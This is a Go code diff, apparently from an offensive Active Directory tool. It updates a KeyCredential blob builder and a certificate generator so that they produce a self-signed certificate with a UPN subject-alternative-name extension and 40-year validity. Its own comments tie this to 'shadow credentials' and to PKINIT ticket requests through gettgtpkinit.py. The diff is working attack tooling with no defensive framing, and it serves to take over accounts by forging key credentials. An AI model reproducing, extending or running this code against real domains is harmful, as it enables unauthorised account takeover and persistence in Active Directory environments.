@@ -9,6 +9,7 @@ import (
 	"encoding/binary"
 	"fmt"
 	"math/big"
+	"strings"
 	"time"
 
 	"github.com/google/uuid"
@@ -69,7 +70,9 @@ func (kc *KeyCredential) BuildKeyCredentialBlob() ([]byte, error) {
 		{Type: 0x04, Value: []byte{0x01}},
 		{Type: 0x05, Value: []byte{0x00}},
 		{Type: 0x06, Value: kc.deviceID[:]},
-		{Type: 0x09, Value: fileTimeNow()},
+		{Type: 0x07, Value: []byte{0x01, 0x00}}, // CustomKeyInfo
+		{Type: 0x08, Value: fileTimeNow()},      // LastLogonTime
+		{Type: 0x09, Value: fileTimeNow()},      // CreationTime
 	}
 
 	keyHash := kc.calculateKeyHash(properties)
@@ -81,7 +84,9 @@ func (kc *KeyCredential) BuildKeyCredentialBlob() ([]byte, error) {
 		{Type: 0x04, Value: []byte{0x01}},
 		{Type: 0x05, Value: []byte{0x00}},
 		{Type: 0x06, Value: kc.deviceID[:]},
-		{Type: 0x09, Value: fileTimeNow()},
+		{Type: 0x07, Value: []byte{0x01, 0x00}}, // CustomKeyInfo
+		{Type: 0x08, Value: fileTimeNow()},      // LastLogonTime
+		{Type: 0x09, Value: fileTimeNow()},      // CreationTime
 	}
 
 	blob := make([]byte, 4)
@@ -160,18 +165,55 @@ func fileTimeNow() []byte {
 	return buf
 }
 
-// GenerateCertificate generates a self-signed X.509 certificate
-func (kc *KeyCredential) GenerateCertificate(cn string) (*x509.Certificate, error) {
+// GenerateCertificate generates a self-signed X.509 certificate with UPN SAN extension
+// for use with gettgtpkinit.py. The domain parameter should be the AD domain (e.g., "domain.local")
+func (kc *KeyCredential) GenerateCertificate(username string, domain string) (*x509.Certificate, error) {
+	// Build UPN: username@domain
+	upn := username + "@" + strings.ToLower(domain)
+
+	// Build UPN otherName SAN extension
+	// OID 1.3.6.1.4.1.311.20.2.3 is the Microsoft UPN OID
+	// Structure:
+	// SEQUENCE {
+	//   [0] {              # otherName context tag
+	//     OBJECT           # UPN OID
+	//     [0] {            # Explicit tag
+	//       UTF8STRING     # UPN value
+	//     }
+	//   }
+	// }
+	upnOID := []byte{
+		0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03,
+	}
+	upnValue := []byte(upn)
+
+	// Build the UTF8STRING
+	utf8Tag := append([]byte{0x0C, byte(len(upnValue))}, upnValue...)
+	// Wrap in explicit [0] tag
+	explicitTag := append([]byte{0xA0, byte(len(utf8Tag))}, utf8Tag...)
+	// Concatenate OID and explicit tag
+	otherNameContent := append(upnOID, explicitTag...)
+	// Wrap in [0] context tag for otherName
+	otherName := append([]byte{0xA0, byte(len(otherNameContent))}, otherNameContent...)
+	// Wrap in SEQUENCE for SAN extension value
+	sanValue := append([]byte{0x30, byte(len(otherName))}, otherName...)
+
 	template := &x509.Certificate{
 		SerialNumber: big.NewInt(1),
 		Subject: pkix.Name{
-			CommonName: cn,
+			CommonName: username,
 		},
-		NotBefore:             time.Now(),
-		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
-		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
-		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
-		BasicConstraintsValid: true,
+		NotBefore:   time.Now().Add(-40 * 365 * 24 * time.Hour), // Valid from 40 years ago
+		NotAfter:    time.Now().Add(40 * 365 * 24 * time.Hour),  // Valid for 40 years
+		KeyUsage:    x509.KeyUsageCertSign,                      // CertSign for shadow credentials
+		ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
+		ExtraExtensions: []pkix.Extension{
+			{
+				Id:       []int{2, 5, 29, 17}, // SAN OID
+				Critical: false,
+				Value:    sanValue,
+			},
+		},
 	}
 
 	certBytes, err := x509.CreateCertificate(rand.Reader, template, template, kc.publicKey, kc.privateKey)
